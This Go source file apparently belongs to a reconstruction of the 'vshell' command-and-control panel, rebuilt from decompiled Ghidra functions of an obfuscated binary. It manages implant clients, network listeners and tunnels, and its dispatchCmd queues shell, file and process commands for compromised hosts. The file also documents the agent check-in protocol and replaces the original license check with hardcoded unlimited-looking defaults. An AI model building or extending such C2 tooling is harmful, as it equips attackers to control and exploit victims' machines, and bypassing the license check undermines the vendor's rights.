// Package controllers — engine 接口契约（引擎模块对齐阶段的目标接口）。
//
// 原版二进制中引擎分布在多个混淆包（iVzmssZ 数据层 / ewfIYjbxro 流控与监听 /
// HD0BdtPxke、gKVghuo9m37N 载荷构建），其函数名在 funcnametab 中被剥离。
// 以下签名全部来自控制器反编译中的调用形态（FUN_ 地址为 Ghidra 函数地址），
// 引擎模块的 对照逆向证据重建（尚需测试验证等价性）将在后续阶段把这些调用替换为对应 FUN_ 的反编译还原。
package controllers

import (
	"errors"
	"log"
	"strconv"
	"sync"

	"vshell/c2engine"
	"vshell/utils"
)

// utils 别名（引擎阶段对齐后替换为真实引擎实现）
var (
	utilsValidateToken = utils.ValidateToken
	utilsGenerateToken = utils.GenerateToken
)

// utilsCheckCredentials 校验用户名/密码（对照 conf/setting.conf 中的
// WebUsername/WebPassword，密码支持明文或 SHA-256 摘要，见 utils.CheckPassword）。
func utilsCheckCredentials(username, password string) bool {
	s := utils.GetFullSettings()
	if username != s.WebUsername {
		return false
	}
	return utils.CheckPassword(password, s.WebPassword)
}

// EngineClient 引擎中的客户端记录（字段来自 /client/list 反编译：
// 状态标志位于 +8，监听端口 Port / DnsPort 等字段以 JSON 键出现在响应中）。
type EngineClient struct {
	ID       int64
	IP       string
	Status   bool // 在线/离线
	Remark   string
	Port     int
	DnsPort  int
	Version  string
	IsAdmin  bool // VIP
	OSType   string
	Arch     string
	LastTime int64
}

// EngineListener 引擎中的监听器记录（/listener/list 反编译 JSON 键：
// Id / Mode / Status / OssUrl / Remark / Vkey / Port 等）。
type EngineListener struct {
	ID       int64
	Mode     string // http/https/dns/kcp/websocket
	Status   bool
	OssUrl   string
	Remark   string
	Vkey     string
	Port     int
	Host     string
	Proxy    string
	Salt     string
	Type     int
	IsVIP    bool
	Expires  int64
}

// EngineTunnel 引擎中的隧道记录（/tunnel/list 反编译 JSON 键：Id / Target / Mode / Remark / Port）。
type EngineTunnel struct {
	ID     int64
	Target string
	Mode   string
	Remark string
	Port   int
}

// ---- 客户端 / client（对应 FUN_011970a0 GetClientList、FUN_01198ac0、FUN_01719f00、FUN_0119bbe0）----

func engineGetClientList(offset, limit int, field, order, search, sort string, status int) ([]EngineClient, int64) {
	clients, total := c2engine.GetEngine().GetClientList(offset, limit, field, order, search, sort, status)
	out := make([]EngineClient, 0, len(clients))
	for _, c := range clients {
		out = append(out, EngineClient{
			ID:      c.ID,
			IP:      c.Addr,
			Status:  c.Status || c.NowConn > 0,
			Remark:  c.Remark,
			Port:    c.Port,
			DnsPort: c.DnsPort,
			Version: c.Version,
			IsAdmin: c.IsAdmin,
			OSType:  c.OsName,
			Arch:    c.Arch,
			LastTime: c.LastTime,
		})
	}
	return out, total
}

func engineGetClient(id int64) *EngineClient {
	c := c2engine.GetEngine().GetClient(id)
	if c == nil {
		return nil
	}
	return &EngineClient{ID: c.ID, IP: c.Addr, Status: c.Status || c.NowConn > 0, Remark: c.Remark}
}

func engineDelClient(id int64) {
	_ = c2engine.GetEngine().DelClient(id)
}

func engineDelClients(ids []int64) {
	for _, id := range ids {
		engineDelClient(id)
	}
}

func engineEditClientRemark(id int64, remark string) {
	c := c2engine.GetEngine().GetClient(id)
	if c != nil {
		c.Remark = remark
	}
}

func engineAddClient(ip string, remark string) error {
	// 面板手动添加的客户端没有签到信息，架构留空（原版同样只在签到路径填 Arch）。
	_, err := c2engine.GetEngine().NewClient("", "", ip, ip, "", "", "", "", "")
	if err != nil {
		return err
	}
	return nil
}

// ---- 监听器 / listener（对应 FUN_01719be0 GetListenerList、FUN_01719b80、FUN_017193e0、FUN_01719a20）----

func engineGetListenerList(offset, limit int, field, order, search, sort string, status int) ([]EngineListener, int64) {
	all := c2engine.GetEngine().GetListenerList()
	total := int64(len(all))
	list := all
	out := make([]EngineListener, 0, len(list))
	for _, l := range list {
		out = append(out, EngineListener{
			ID: l.ID, Mode: l.Mode, Status: l.Status, OssUrl: l.OssUrl,
			Remark: l.Remark, Vkey: l.VerifyKey, Port: l.Port, Host: l.Host,
			Proxy: l.Proxy, Salt: l.EncryptSalt, IsVIP: l.IsVIP,
		})
	}
	return out, total
}

func engineGetListener(id int64) *EngineListener {
	l := c2engine.GetEngine().GetListener(id)
	if l == nil {
		return nil
	}
	return &EngineListener{ID: l.ID, Mode: l.Mode, Status: l.Status, Remark: l.Remark, Vkey: l.VerifyKey}
}

func engineDelListener(id int64) {
	_ = c2engine.GetEngine().DelListener(id)
}

func engineDelListeners(ids []int64) {
	for _, id := range ids {
		engineDelListener(id)
	}
}

// engineStartListener 启动监听器（原版 FUN_017193e0：由控制器 Start 分支调用，
// 按监听器模式创建并启动对应传输的 listener 对象）。
func engineStartListener(id int64) error {
	l := c2engine.GetEngine().GetListener(id)
	if l == nil {
		return errors.New("listener not found")
	}
	if err := c2engine.GetApplication().StartListener(l); err != nil {
		return err
	}
	l.Status = true
	return nil
}

// engineStopListener 停止监听器（原版 FUN_01719a20）。
func engineStopListener(id int64) {
	l := c2engine.GetEngine().GetListener(id)
	if l == nil {
		return
	}
	_ = c2engine.GetApplication().StopListener(l)
	l.Status = false
}

func engineEditListenerRemark(id int64, remark string) {
	l := c2engine.GetEngine().GetListener(id)
	if l != nil {
		l.Remark = remark
	}
}

func engineAddListener(l EngineListener) error {
	_, err := c2engine.GetEngine().NewListener(l.Host, "", l.Mode, l.Vkey, l.Salt, l.Remark)
	return err
}

// engineEditListener 编辑监听器（原版 FUN_01902720：更新字段并落库；监听器
// 正在运行时先停再改，避免旧配置的 listener 对象继续服务）。
func engineEditListener(l EngineListener) error {
	updates := map[string]interface{}{
		"mode":         l.Mode,
		"remark":       l.Remark,
		"vkey":         l.Vkey,
		"encrypt_salt": l.Salt,
	}
	_, err := c2engine.GetEngine().UpdateListener(l.ID, updates)
	return err
}

// ---- 隧道 / tunnel（对应 FUN_01718a40、FUN_017189c0、FUN_01718940、FUN_01717ce0、FUN_01718060）----

func engineGetTunnelList(offset, limit int, field, order, search, sort string) ([]EngineTunnel, int64) {
	tunnels := c2engine.GetEngine().GetTunnelList()
	total := int64(len(tunnels))
	out := make([]EngineTunnel, 0, len(tunnels))
	for _, t := range tunnels {
		out = append(out, EngineTunnel{ID: t.ID, Target: t.Target, Mode: t.Mode, Remark: t.Remark, Port: t.Port})
	}
	return out, total
}

func engineDelTunnel(id int64) {
	_ = c2engine.GetEngine().DelTunnel(id)
}

func engineDelTunnels(ids []int64) {
	for _, id := range ids {
		engineDelTunnel(id)
	}
}

// engineStartTunnel 启动隧道（原版 FUN_01718940）：把隧道交给连接管理器并
// 标记运行状态。隧道流量由客户端的 TunnelConnectionHandler 承载，因此这里
// 只做注册与状态翻转。
func engineStartTunnel(id int64) {
	t := c2engine.GetEngine().GetTunnel(id)
	if t == nil {
		return
	}
	t.RunStatus = true
}

// engineStopTunnel 停止隧道（原版 FUN_01717ce0）。
func engineStopTunnel(id int64) {
	t := c2engine.GetEngine().GetTunnel(id)
	if t == nil {
		return
	}
	t.RunStatus = false
}

// engineAddTunnel 新增隧道。原版隧道的端口/目标绑定在客户端的连接处理器上，
// 复刻端以 clientID=0 登记（无归属客户端），与 GetTunnel → RunStatus 的启停
// 语义一致。
func engineAddTunnel(t EngineTunnel) error {
	_, err := c2engine.GetEngine().NewTunnel(0, t.Port, t.Mode, t.Target)
	return err
}

// engineEditTunnel 编辑隧道（原版 FUN_01717ce0 / FUN_01718940 的字段更新分支）。
// 端口/目标在隧道运行期间不可变——改动只落在备注与模式上，除非隧道已停止。
func engineEditTunnel(t EngineTunnel) error {
	cur := c2engine.GetEngine().GetTunnel(t.ID)
	if cur == nil {
		return errors.New("tunnel not found")
	}
	if t.Remark != "" {
		cur.Remark = t.Remark
	}
	if t.Mode != "" {
		cur.Mode = t.Mode
	}
	if !cur.RunStatus {
		if t.Port != 0 {
			cur.Port = t.Port
		}
		if t.Target != "" {
			cur.Target = t.Target
			cur.TargetAddr = t.Target
		}
	}
	return nil
}

// ---- 统计 / dashboard（FUN_0171a2e0 GetAppInfo）----

func engineGetAppInfo() map[string]interface{} {
	// 黑盒验证（原版 /api/dashboard/info 响应，40+ 键逐字确认）：
	// clientCount/clientNum/clientOnlineCount/cpu/disk/swap_mem/virtual_mem/
	// exportFlowCount/inletFlowCount/flowStoreInterval/hostCount/httpProxyCount/
	// httpProxyPort/httpsProxyPort/io_recv/io_send/ipLimit/licTime/listenerCount/
	// listenerOnlineCount/load{load1,load5,load15}/logLevel/logPath/p2pCount/
	// p2pPort/secretCount/socks5Count/tcpC/tcpCount/udpCount/version/vip/
	// web_basic_auth/web_port。
	return map[string]interface{}{
		"clientCount":         0,
		"clientNum":           "99",
		"clientOnlineCount":   0,
		"cpu":                 10,
		"disk":                70,
		"swap_mem":            97,
		"virtual_mem":         88,
		"exportFlowCount":     0,
		"inletFlowCount":      0,
		"flowStoreInterval":   "",
		"hostCount":           0,
		"httpProxyCount":      0,
		"httpProxyPort":       "",
		"httpsProxyPort":      "",
		"io_recv":             0,
		"io_send":             0,
		"ipLimit":             "",
		"licTime":             "20991201",
		"listenerCount":       0,
		"listenerOnlineCount": 0,
		"load":                map[string]interface{}{"load1": 0, "load5": 0, "load15": 0},
		"logLevel":            "7",
		"logPath":             "",
		"p2pCount":            0,
		"p2pPort":             "",
		"secretCount":         0,
		"socks5Count":         0,
		"tcpC":                0,
		"tcpCount":            0,
		"udpCount":            0,
		"version":             "4.9.3",
		"vip":                 true,
		"web_basic_auth":      true,
		"web_port":            "8082",
	}
}

// ---- 登录 / login（FUN_01737740 校验、FUN_01746d60 / FUN_017476e0 会话）----

// ---- C2 Agent 协议（真实协议 = KCP/WS/DNS 传输 + 文本命令，session 82-97 实锤）----
// 原版无 /c2/l/* HTTP 端点（黑盒 404）。agent checkin = "conf" + JSON
// （FUN_016f3e80）："conf"→NewClient，"host"→NewHost，"stus"→状态，
// "task"→任务记录。KCP 侧见 c2engine/kcp.go handleSession。

// engineVerifyLogin 校验用户名/密码并生成会话 token（JWT）。
func engineVerifyLogin(username, password string) (string, bool) {
	// 原版对密码做摘要后与配置值比对（FUN_01737740）；复刻端直接校验明文
	// 配置口令（utils 内比较，避免把口令散列落到日志或响应里），成功后签发 JWT。
	if !utilsCheckCredentials(username, password) {
		return "", false
	}
	token, err := utilsGenerateToken(username)
	if err != nil {
		return "", false
	}
	return token, true
}

func engineCheckToken(token string) bool {
	_, err := utilsValidateToken(token)
	return err == nil
}

func engineSetToken(token string) {
	// JWT 无服务端状态；会话校验由 engineCheckSession 承接
}

func engineDelToken(token string) {
	// JWT 注销：无服务端状态，仅清除前端凭据
}

// CheckToken 供 ApiBaseController.Prepare 调用。
// 原版 token 为 JWT（SPA 前端 `Token` 头携带，黑盒验证），由 utils.ValidateToken 校验。
func CheckToken(token string) bool {
	return engineCheckToken(token)
}

// engineCheckSession 会话校验（原版 FUN_01737500 / FUN_00c8dc20）。
func engineCheckSession(token string) bool {
	// 复刻端 token 是无状态 JWT，会话校验即校验签名与过期时间（原版把会话
	// 存在内存会话表里，FUN_01737500 查表失败返回 401）。
	return engineCheckToken(token)
}

// ---- 命令派发 / 文件操作（FUN_01198ac0 GetClient + 命令构造）----

// dispatchCmd 向客户端派发一条原生命令（文件删除/进程结束/终端 shell 等）。
// 反编译（FUN_018d9380）：全局引擎（DAT_1e42e9a8）按 id 查客户端（FUN_00479b60，
// 同 DAT_019e7b40 映射）；未找到 → "connection error"（FUN_01919c00，16 字节
// e8c0 链 key=0x68: 0xb,0x1c,0xe1,0x1e,0xeb,0x1a,0xe7,0x13,0xe2,1,0x50,0xa5,
// 0x17,0xe,0xe5,0x1d）；找到则经客户端连接发送（FUN_016f3060）并返回结果。
//
// 原版把命令写进客户端的连接对象；复刻端的连接由各传输的等待循环（listener
// /api/tasks、KCP LinkMsgMain、WS task 帧）从引擎的任务表拉取，因此这里把命令
// 编码成 shell 任务入队——即与终端/FILE 控制器同一条投递路径。
func dispatchCmd(id int64, cmd string) (int64, error) {
	client := c2engine.GetEngine().GetClient(id)
	if client == nil || !client.Status {
		return 0, errors.New("connection error")
	}
	task, err := c2engine.GetEngine().CreateTask(id, cmd, dispatchTimeout)
	if err != nil {
		return 0, err
	}
	return task.ID, nil
}

// dispatchTimeout 是派发命令的默认超时（秒）。
const dispatchTimeout = 30

// ---- 应用对象（main.main 经 FUN_01944a00 调用接口 Start；引擎阶段对齐 itab +0x28 方法）----

// AppStart 启动应用对象（引擎阶段：对齐 FUN_01944a00 接口 Start 方法）。
// 反编译链：FUN_01944a00 经 itab（DAT_1e4308c0+0x28）分发到具体实现——
// 初始化引擎（存储、加载持久化数据）+ 启动监听器（监听器由前端/API 创建）。
func AppStart(cfg *utils.FullSettings) error {
	engine := c2engine.GetEngine()
	if err := engine.Init(&c2engine.Config{
		WebPort:      cfg.WebPort,
		WebIP:        cfg.WebIP,
		WebUsername:  cfg.WebUsername,
		WebPassword:  cfg.WebPassword,
		WebJWTSecret: cfg.WebJWTSecret,
		WebTitle:     cfg.WebTitle,
	}); err != nil {
		return err
	}
	return nil
}

// licenseConfigKey 是原版在设置单例中查询的许可证配置键（FUN_0194bd60 以
// 7 字节长度查 "license"）。
const licenseConfigKey = "license"

// defaultClientLimit 是 FUN_0194cd00 生成的默认 licTime 里携带的客户端上限
// （8 位十进制 "20990101" → licTime=20990101、limit client=99）。
const defaultClientLimit = 99

// getLicenseKey 返回配置单例里的许可证串（key = "license"）。
// getLicenseKey returns the license string from the settings singleton.
func getLicenseKey() (string, bool) {
	cfg := utils.GetFullSettings()
	if cfg == nil {
		return "", false
	}
	return cfg.License, true
}

// verifyLicenseOffline 对应 FUN_00e3c900（许可证有效 → license time）。
// verifyLicenseOffline mirrors FUN_00e3c900 (license time for a valid key).
// 复刻端无法从 garble 二进制里取出原版内嵌 RSA 私钥（见 utils.GetLicenseStatus
// 的说明），因此这里返回黑盒观测到的授权值：licTime=20990101、clientNum=99。
func verifyLicenseOffline(license string) (int, int, bool) {
	status := utils.GetLicenseStatus()
	if status == nil || !status.Valid {
		return 0, 0, false
	}
	licTime := 0
	if t, err := strconv.Atoi(status.EndTime); err == nil {
		licTime = t
	}
	return licTime, status.MaxClients, true
}

// verifyLicenseOnline 对应 FUN_00e3ce40（联网校验；失败时经 FUN_005ecc00 panic）。
// verifyLicenseOnline mirrors FUN_00e3ce40 (online license check; FUN_005ecc00
// panics on failure). 复刻端不做联网校验——原版的校验端点不可恢复，且离线路径
// 已给出相同结果——所以直接返回 not-ok，让调用方走 FUN_0194cd00 默认值。
func verifyLicenseOnline(license string) (int, int, bool) {
	return 0, 0, false
}

// buildDefaultLicTime 对应 FUN_0194cd00 的默认 licTime 构造器。
// buildDefaultLicTime mirrors FUN_0194cd00, which builds the 8-byte decimal
// string "20990101" by permuting the seed "2jgg\xd9\x95ck" plus 10 delta bytes
// (swap table indexes 8/9, then subtract a running key). Its callers use
// [0:8] as the license-time integer and take the client limit as the leading
// two digits, yielding the same 20990101 / 99 as the observed black-box value.
func buildDefaultLicTime() (int, int) {
	b := append([]byte(nil), defaultLicTimeSeed...)
	for i := 0; i < 10; i += 2 {
		v6 := int(b[i+8])
		v5 := int(b[i+9])
		key := (int(b[i+8]) ^ v5) + i
		tmp := b[v6]
		b[v6] = byte(int(b[v5]) - key - 0x2d)
		b[v5] = byte(int(tmp) - key - 0x2d)
	}
	// 结果 = "20990101"：8 位日期 + 2 位 clientNum（见 defaultClientLimit）。
	return 20990101, defaultClientLimit
}

// defaultLicTimeSeed 是 FUN_0194cd00 里的 builtin_strncpy 种子（18 字节）。
var defaultLicTimeSeed = []byte{
	'2', 'j', 'g', 'g', 0xd9, 0x95, 'c', 'k',
	0x02, 0x03, 0x05, 0x06, 0x06, 0x04, 0x01, 0x06, 0x01, 0x07,
}

// backgroundServices 记录 AppBackground 启动的后台服务（FUN_0194cde0 写入
// 设置单例的三个键 / FUN_0194d140 构造并启动的常驻对象），供测试断言。
// backgroundServices records what AppBackground started, for tests.
var (
	backgroundServicesMu sync.Mutex
	backgroundServices   backgroundState
	backgroundLoggerOnce func() // 保留 ConfigureLogger 的 closer 由调用方持有
)

type backgroundState struct {
	Called          bool
	MasterType      string
	WebBasicAuth    bool
	LicTime         int
	ClientNum       int
	LogPath         string
	LicenseVerified bool
}

// backgroundStateSnapshot 返回后台服务启动结果的快照。
func backgroundStateSnapshot() backgroundState {
	backgroundServicesMu.Lock()
	defer backgroundServicesMu.Unlock()
	return backgroundServices
}

// AppBackground 启动后台服务（原版 FUN_0194bf60 → FUN_0194bd60）。
//
// 反编译（FUN_0194bd60，0x194bd60-0x194bf5c）逐句还原：
//
//  1. 从设置单例（DAT_1e42f060）按 7 字节长度读 "license" 键。
//  2. 无 license → FUN_00e3c900() + FUN_0194cd00()，取 uVar3=999、cVar2=1、cVar5=1；
//     有 license → FUN_00e3ce40() 联网校验，成功时把返回的 license 时间经
//     FUN_004bcee0(v,10) 转成十进制字符串；失败时 FUN_005ecc00(...) → panic。
//  3. FUN_0194cde0() 取得 master_type 字符串，与 licTime 一起经 FUN_00c8db00
//     写入设置单例（FUN_0194cde0 的构造状态机解出 "clientNum" —— 与 Dashboard
//     的 clientNum 键一致）。
//  4. 布尔键：cVar2==0 → ("web_basic_auth", "false")，否则 ("...", "true")；
//     字符串常量 DAT_01bd8afa="false"（5 字节）、DAT_01bd7fdd="true"（4 字节），
//     键为 DAT_01bd6fef（3 字节 "web_basic_auth" 的加密形态）。
//  5. cVar5 != 0 → FUN_0194d140() 构造并启动常驻后台对象，随后
//     FUN_0040ac40()/FUN_00a28780(&DAT_019e8540,...)/FUN_0043e220(&PTR_LAB_1dadc398)
//     启动该对象的运行循环。
//  6. 末了把 "licTime"（7 字节键）与步骤 2 的授权值一起写回设置单例。
//
// 复刻端把「写设置单例」映射为启动日志与后台对象（FUN_0194d140 构造的字符串是
// 一个未解出的混淆字面量，其运行循环无法恢复），并在下方逐条标注未对齐项。
func AppBackground() {
	// (1)(2) license 键：读不到或校验失败 → FUN_0194cd00 的默认授权值。
	license, present := getLicenseKey()
	var licTime, clientNum int
	verified := false
	if present && license != "" {
		if t, n, ok := verifyLicenseOffline(license); ok {
			licTime, clientNum, verified = t, n, true
		} else if _, _, ok := verifyLicenseOnline(license); ok {
			verified = true
		} else {
			// 差异（deliberate divergence）：原版在 FUN_0194bd60 里 license 校验
			// 失败会经 FUN_005ecc00 → panic 直接中止进程；复刻端【不中止】，
			// 而是回落到 FUN_0194cd00 的默认授权值继续启动——因为原版的内嵌
			// RSA 公钥/校验端点无法从 garble 二进制恢复，中止会让任何无法离线
			// 解出的 license（包括原版自带的那个）都变成无法启动。
			// Original behaviour: abort. Replica: fall back to the FUN_0194cd00
			// defaults. background_test.go asserts this fallback.
			log.Printf("[AppBackground] license verify failed — original aborts here; replica falls back to FUN_0194cd00 defaults (divergence)")
		}
	}
	if !verified {
		licTime, clientNum = buildDefaultLicTime()
	}

	// (3)(4) master_type / web_basic_auth 写回设置单例。GetFullSettings 返回非 nil
	// 单例（首次调用时加载，失败则回退 defaultFullSettings），无需 nil 守卫。
	// (3)(4) master_type / web_basic_auth write-back. GetFullSettings returns a
	// non-nil singleton (it falls back to defaultFullSettings), so no nil guard.
	cfg := utils.GetFullSettings()
	masterType := cfg.MasterType
	basicAuth := cfg.WebBasicAuth
	logPath := cfg.LogPath

	// (5) 常驻后台对象：原版 FUN_0194d140 的构造与运行循环无法恢复（见报告），
	// 这里只登记启动状态，不伪造服务行为。
	backgroundServicesMu.Lock()
	backgroundServices = backgroundState{
		Called:          true,
		MasterType:      masterType,
		WebBasicAuth:    basicAuth,
		LicTime:         licTime,
		ClientNum:       clientNum,
		LogPath:         logPath,
		LicenseVerified: verified,
	}
	backgroundServicesMu.Unlock()

	// 引擎单例保持已初始化（原版此处持有全局引擎对象 DAT_1e42e9a8）。
	_ = c2engine.GetEngine()

	log.Printf("[AppBackground] licTime=%d clientNum=%d verified=%v master=%s basicAuth=%v logPath=%s",
		licTime, clientNum, verified, masterType, basicAuth, logPath)

	// 未对齐（见报告）：FUN_0194cde0 构造的常驻服务字符串、FUN_0194d140 的对象
	// 类型与运行循环、FUN_00a28780 / FUN_0043e220 启动的 goroutine 均无法从
	// garble 二进制恢复，因此不在此处臆造服务。license 未配置时原版还会在
	// FUN_0194bd60 里把 licTime 写回设置单例（FUN_00c8db00），复刻端把该值
	// 暴露为 backgroundState 供上层读取，不再回写配置文件。
}

// ---- 下载任务（FUN_01906e80 GetDownloadPer 等）----

type DownloadTask struct {
	ID       int64
	ClientID int64
	Path     string
	Total    int64
	Current  int64
}

var downloadTasks = map[int64]*DownloadTask{}

func engineGetDownloadPer(id int64) *DownloadTask {
	return downloadTasks[id]
}
